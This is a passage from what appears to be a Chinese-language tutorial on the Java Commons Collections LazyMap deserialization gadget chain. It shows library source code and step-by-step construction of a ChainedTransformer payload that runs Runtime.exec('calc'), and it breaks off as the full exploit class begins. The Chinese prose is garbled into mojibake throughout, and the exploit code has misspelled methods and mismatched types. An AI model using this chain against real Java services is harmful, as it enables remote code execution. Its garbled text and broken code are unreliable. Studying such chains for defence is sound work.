<p>ÊöÇÊó∂Â∞±ÈÄöËøáÂÆû‰æãÊù•Á®çÂæÆÁêÜËß£‰∏Ä‰∏ãÔºåÁúãËøô‰∏™entryÁöÑÂÄºÔºåÂâçÈù¢ÊâÄÂ±ûÂ∞±ÊòØ<code>AbstractInputCheckedMapDecorator$MapEntry</code>Ôºà‰∏ªË¶ÅÂ∞±ÊòØËøôÈáåÊâÄÂ±û‰∏∫‰ªÄ‰πàÊòØËøô‰∏™ËøòÊúâÁÇπ‰∏çÊ∏ÖÊ•öÔºâÔºåËøôÊ†∑‰πüÂ∞±ËÉΩÂ§üËØ¥Êòé‰∏∫‰ªÄ‰πàreadObject()ÊñπÊ≥ï‰∏≠Âú®Ë∞ÉÁî®setValue()ÊñπÊ≥ïÊó∂‰ºöÂà∞Ëøô‰∏™<code>MapEntry</code>Á±ªÔºàÂ∞±ÁÆóÁõ¥Êé•Âú®readObjectÊñπÊ≥ïÊâìÊñ≠ÁÇπÊâÄÂ±ûËøòÊòØËøô‰∏™ÔºâÔºå‰ªéËÄåÂØºËá¥Êï¥Êù°ÈìæÂ≠êÁöÑÊâßË°å„ÄÇ</p>
<h5 id="lazymapÈìæ">LazyMapÈìæ
</h5><p>ÂÆûÈôÖ‰∏äÔºåÂú®ysoserialÈìæ‰∏≠ÔºåÂÆÉÂà©Áî®ÁöÑÂπ∂‰∏çÊòØTransformedMapÔºåËÄåÊòØÂà©Áî®ÁöÑLazyMap„ÄÇ</p>
<h6 id="ÂàÜÊûêÂèäÊûÑÈÄ†ËøáÁ®ã">ÂàÜÊûêÂèäÊûÑÈÄ†ËøáÁ®ã
</h6><p>LazyMapÁöÑÊºèÊ¥ûËß¶ÂèëÁÇπÊòØÂÆÉÁöÑ<code>get()</code>ÊñπÊ≥ïgetÊñπÊ≥ïÔºå‰πüÂ∞±ÊòØgetÊñπÊ≥ïÊ∫êÁ†Å‰∏≠ÁöÑ<code>factory.transform()</code>„ÄÇ‰πüÂ∞±ÊòØLazyMapÁöÑ‰ΩúÁî®ÊòØ‚ÄúÊáíÂä†ËΩΩ‚ÄùÔºåÂú®getÊâæ‰∏çÂà∞ÂÄºÁöÑÊó∂ÂÄôÔºåÂÆÉ‰ºöË∞ÉÁî®<code>factory.transform</code>ÊñπÊ≥ïÂéªËé∑Âèñ‰∏Ä‰∏™ÂÄºÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">get</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">key</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="na">map</span><span class="p">.</span><span class="na">containsKey</span><span class="p">(</span><span class="n">key</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">//ÂÆ°‰ª£Á†ÅÂ¶ÇÊûú‰º†ÂÖ•ÁöÑkey‰∏çÂ≠òÂú®ÔºåÂ∞±‰ºöÊâç‰ºöËøõÂÖ•Ëøô‰∏™ifÊù°‰ª∂</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Object</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">factory</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">key</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">this</span><span class="p">.</span><span class="na">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">value</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">map</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">key</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Áõ∏ËæÉ‰∫éTransformedMapÈìæÁöÑÂà©Áî®ÊñπÊ≥ïÔºåLazyMapÁöÑÂà©Áî®Êõ¥Â§çÊùÇ‰∏Ä‰∫õÔºåÁî±‰∫é<code>sun.reflect.annotation.AnnotationInvocationHandler</code>ÁöÑreadObjectÊñπÊ≥ï‰∏≠Ê≤°ÊúâË∞ÉÁî®Âà∞MapÁöÑgetÊñπÊ≥ï„ÄÇ‰ΩÜÊòØ<code>AnnotationInvocationHandler</code>Á±ªÁöÑinvokeÊñπÊ≥ïÊúâË∞ÉÁî®Âà∞getÊñπÊ≥ïÔºåÊ∫êÁ†ÅÂ¶Ç‰∏ãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">invoke</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">proxy</span><span class="p">,</span><span class="w"> </span><span class="n">Method</span><span class="w"> </span><span class="n">method</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">member</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">method</span><span class="p">.</span><span class="na">getName</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;[]</span><span class="w"> </span><span class="n">paramTypes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">method</span><span class="p">.</span><span class="na">getParameterTypes</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// Handle Object and Annotation methods</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">member</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="s">&#34;equals&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">paramTypes</span><span class="p">.</span><span class="na">length</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">1</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">paramTypes</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">equalsImpl</span><span class="p">(</span><span class="n">args</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">paramTypes</span><span class="p">.</span><span class="na">length</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">AssertionError</span><span class="p">(</span><span class="s">&#34;Too many parameters for an annotation method&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">switch</span><span class="p">(</span><span class="n">member</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="s">&#34;toString&#34;</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">toStringImpl</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="s">&#34;hashCode&#34;</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">hashCodeImpl</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="s">&#34;annotationType&#34;</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">type</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// Handle annotation member accessors</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">memberValues</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">member</span><span class="p">);</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">result</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">IncompleteAnnotationException</span><span class="p">(</span><span class="n">type</span><span class="p">,</span><span class="w"> </span><span class="n">member</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">result</span><span class="w"> </span><span class="k">instanceof</span><span class="w"> </span><span class="n">ExceptionProxy</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="p">((</span><span class="n">ExceptionProxy</span><span class="p">)</span><span class="w"> </span><span class="n">result</span><span class="p">).</span><span class="na">generateException</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">result</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">isArray</span><span class="p">()</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">Array</span><span class="p">.</span><span class="na">getLength</span><span class="p">(</span><span class="n">result</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cloneArray</span><span class="p">(</span><span class="n">result</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">result</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÈÇ£‰πàÂ¶Ç‰ΩïË∞ÉÁî®Âà∞<code>AnnotationInvocationHandler#invoke</code>Âë¢ÔºüËøôÈáåÂ∞±ÂèØ‰ª•Âà©Áî®Âà∞Âä®ÊÄÅ‰ª£ÁêÜ„ÄÇ</p>
<p><strong>Áé∞Âú®ÂÖàÂõûÂà∞LazyMapÁöÑget()ÊñπÊ≥ïÊ∫êÁ†Å</strong>ÔºåÈáçÁÇπÂàÜÊûê‰∏Ä‰∏ãifËØ≠Âè•Ôºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">get</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">key</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="na">map</span><span class="p">.</span><span class="na">containsKey</span><span class="p">(</span><span class="n">key</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">//ÂÆ°‰ª£Á†ÅÂ¶ÇÊûú‰º†ÂÖ•ÁöÑkey‰∏çÂ≠òÂú®ÔºåÂ∞±‰ºöÊâç‰ºöËøõÂÖ•Ëøô‰∏™ifÊù°‰ª∂</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Object</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">factory</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">key</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">this</span><span class="p">.</span><span class="na">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">value</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Êù•ÁúãËøõÂÖ•ifËØ≠Âè•ÁöÑÊù°‰ª∂Ôºå<code>this.map.containsKey(key)</code>Â∞±ÊòØÁúãÈîÆÂÄºË°®‰∏≠ÊòØÂê¶ÊúâËøô‰∏™keyÔºåÂú®ËøôÈáåÈúÄË¶ÅÊ≤°ÊúâËøô‰∏™keyÊâçËÉΩËøõÂÖ•ifÊù°‰ª∂ÔºõÈÇ£‰πàËøô‰∏™keyÂØπÂ∫îÁöÑinvoke‰∏≠ÁöÑ‰ª£Á†ÅÂ∞±ÊòØ<code>String member = method.getName();</code> Â≠¶ËøáÂä®ÊÄÅ‰ª£ÁêÜÁöÑËØùÂ∞±Áü•ÈÅìËøôÈáåÁöÑmemberÂØπÂ∫îÁöÑÂ∞±ÊòØ‰ª£ÁêÜÂØπË±°Ë∞ÉÁî®ÁöÑÊñπÊ≥ïÂêçÔºå‰∏ÄËà¨Âú®‰∏Ä‰∏™javaÂØπË±°‰∏≠ÈÉΩ‰∏ç‰ºöÊúâ‰∏Ä‰∏™‰ª•ÊñπÊ≥ïÂêç‰∏∫ÈîÆÁöÑÈîÆÂÄºÂØπÔºåÊâÄ‰ª•‰∏ÄËà¨ËøôÈáåÁöÑifÊù°‰ª∂ÂÖ∂ÂÆûÊòØÂèØ‰ª•ÂøΩÁï•ÁöÑ„ÄÇÁÑ∂ÂêéÊàëÊÉ≥‰∫Ü‰∏Ä‰∏ãÔºåÂ¶ÇÊûúÊàëËÆ§‰∏∫ËÆæÁΩÆ‰∏Ä‰∏™ÈîÆÂÄºÂØπÁöÑÈîÆÂ∞±ÊòØ‰ª£ÁêÜÂØπË±°Ë¶ÅË∞ÉÁî®ÁöÑÊñπÊ≥ïÂêçÁß∞ÔºåÈÇ£‰πàÊòØÂê¶Â∫îËØ•‰∏ç‰ºöÁªßÁª≠‰∏ãÂéª„ÄÇÁêÜËÆ∫‰∏äÊòØ‰∏™‰∫∫ÊÑüËßâÊòØÂèØ‰ª•ÁöÑÔºåÂêéÈù¢ÂÆûË∑µ‰∏Ä‰∏ã„ÄÇ</p>
<p>‚Äî‚Äî</p>
<p>Áé∞Âú®ÁªßÁª≠ÈìæÂ≠êÁöÑËØ¥Êòé</p>
<p>ÂâçÈù¢ËØ¥Âà∞‰∫ÜÈúÄË¶ÅÁî®Âä®ÊÄÅ‰ª£ÁêÜÔºåÊâÄ‰ª•ËøôÈáåÈúÄË¶ÅÁî®Âà∞<code>java.lang.reflect.Proxy</code>‰ª•Âèä<code>InvocationHandlerÊé•Âè£</code></p>
<p>Âú®ËøôÈáå<code>AnnotationInvocationHandler</code>ÂÆûÁé∞‰∫Ü<code>InvocationHandler</code>Êé•Âè£Âπ∂ÈáçÂÜô‰∫ÜinvokeÊñπÊ≥ïÔºåÁ¨¶ÂêàÂü∫Êú¨Êù°‰ª∂„ÄÇ</p>
<p>Áúã‰ª£Á†ÅÊâÄÈúÄÁöÑÂØπË±°ÔºåËøôÈáåÂ∞±ÁúãÁúãÂú®Âì™‰∫õÂú∞ÊñπÈúÄË¶ÅÊ≥®ÊÑèÔºö
È¶ñÂÖàÂ∞±ÊòØ<code>AnnotationInvocationHandler#invoke</code>‰∏≠Ë∞ÉÁî®get()ÁöÑÂú∞ÊñπÔºå<code>memberValues.get(member);</code>ÔºåÊâÄ‰ª•ËøôÈáåÁöÑmembervaluesÈúÄË¶Å‰∏∫LazyMapÁ±ªÂØπË±°ÔºåÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•Â¶Ç‰∏ãÊûÑÈÄ†Ôºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Class</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Constructor</span><span class="w"> </span><span class="n">constructor1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredConstroctor</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">constroctor1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">object</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">constructor1</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Retention</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">outerMap</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Áé∞Âú®ÂÜçÊù•Áúã‰∏Ä‰∏ãouterMapÁöÑÂÜÖÂÆπÔºåÁé∞Âú®È¶ñÂÖàÂ∞±ÈúÄË¶ÅÁúã‰∏Ä‰∏ãLazyMapÁöÑÊûÑÈÄ†ÊñπÊ≥ïÁ≠âÔºåÁ®çÂæÆÁúã‰∏Ä‰∏ãÊ∫êÁ†ÅÔºåÂèØ‰ª•Áü•ÊôìÊàë‰ª¨Âà©Áî®Âà∞ÁöÑ‰ª£Á†Å‰∏∫Ôºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Map</span><span class="w"> </span><span class="nf">decorate</span><span class="p">(</span><span class="n">Map</span><span class="w"> </span><span class="n">map</span><span class="p">,</span><span class="w"> </span><span class="n">Transformer</span><span class="w"> </span><span class="n">factory</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">(</span><span class="n">map</span><span class="p">,</span><span class="w"> </span><span class="n">factory</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">protected</span><span class="w"> </span><span class="nf">LazyMap</span><span class="p">(</span><span class="n">Map</span><span class="w"> </span><span class="n">map</span><span class="p">,</span><span class="w"> </span><span class="n">Transformer</span><span class="w"> </span><span class="n">factory</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">super</span><span class="p">(</span><span class="n">map</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">factory</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">IllegalArgumentException</span><span class="p">(</span><span class="s">&#34;Factory must not be null&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">this</span><span class="p">.</span><span class="na">factory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">factory</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•Â¶Ç‰∏ãÊûÑÈÄ†Ôºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Transformer</span><span class="w"> </span><span class="n">chain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">})});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                                                             
</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">Map</span><span class="w"> </span><span class="n">hashMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">Transformer</span><span class="w"> </span><span class="n">outerMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">hashMap</span><span class="p">,</span><span class="n">chain</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÂÜçÂ∞ÜÂâçÈù¢ÁªºÂêà‰∏Ä‰∏ãÔºåÂ∞±ÊòØÂ¶Ç‰∏ãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
